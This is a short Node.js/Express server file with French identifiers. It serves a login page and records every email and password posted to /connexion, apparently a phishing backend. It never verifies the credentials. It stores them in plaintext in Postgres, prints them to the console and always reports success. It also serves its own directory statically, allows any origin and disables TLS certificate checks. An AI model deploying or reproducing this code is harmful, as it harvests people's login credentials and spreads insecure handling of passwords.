const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

async function init() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS utilisateurs (
      id SERIAL PRIMARY KEY,
      email TEXT NOT NULL,
      mot_de_passe TEXT NOT NULL,
      date_connexion TEXT NOT NULL
    )
  `);
  console.log('✅ Table prête');
}
init();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/connexion.html');
});

app.post('/connexion', async (req, res) => {
  const { email, mot_de_passe } = req.body;
  const date = new Date().toLocaleString('fr-FR');
  await pool.query(
    'INSERT INTO utilisateurs (email, mot_de_passe, date_connexion) VALUES ($1, $2, $3)',
    [email, mot_de_passe, date]
  );
  console.log(`✅ Enregistré : ${email} | ${mot_de_passe} | ${date}`);
  res.json({ succes: true });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`✅ Serveur démarré sur le port ${PORT}`);
});
